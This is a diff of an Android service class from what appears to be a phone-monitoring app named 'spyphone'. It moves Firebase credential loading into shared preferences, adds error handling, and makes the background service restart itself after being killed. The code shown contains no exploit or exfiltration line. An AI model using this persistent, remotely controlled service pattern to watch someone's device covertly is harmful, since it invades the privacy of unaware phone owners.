@@ -3,6 +3,7 @@ package emit.esy.es.spyphone.services;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -18,7 +19,7 @@ import emit.esy.es.spyphone.util.FirebaseUtil;
 public class BrokerService extends Service {
 
     private final String LOG_TAG = "BrokerService";
-    String IMEI, username, password;
+    String IMEI, username, password, id;
     FirebaseUtil fu;
 
     @Override
@@ -26,12 +27,17 @@ public class BrokerService extends Service {
         super.onCreate();
         Log.d(LOG_TAG, "onCreate");
         Firebase.setAndroidContext(this);
-        password = getString(R.string.password);
-        username = createUsername();
+        SharedPreferences sp = getSharedPreferences(getString(R.string.sharedPrefs), Context.MODE_PRIVATE);
+        password = sp.getString("password", null);
+        username = sp.getString("username", null);
 
         //Authenticate user to firebase
-        fu = new FirebaseUtil(this, username, password);
-        fu.authenticateUser();
+        try {
+            fu = new FirebaseUtil(this);
+            fu.authenticateUser(username, password, true);
+        } catch (Exception e){
+            Log.d(LOG_TAG, e.toString());
+        }
     }
 
     @Override
@@ -40,7 +46,7 @@ public class BrokerService extends Service {
 
         fu.setUpChildRef();
 
-        return START_NOT_STICKY;
+        return START_STICKY;
     }
 
     private String createUsername() {
@@ -64,7 +70,12 @@ public class BrokerService extends Service {
     @Override
     public void onDestroy() {
         Log.d(LOG_TAG, "onDestroy");
-        fu.removeListener();
+        try{
+            fu.unauth();
+            fu.removeListener();
+        } catch (Exception e){
+            Log.d(LOG_TAG, e.toString());
+        }
         super.onDestroy();
     }
 
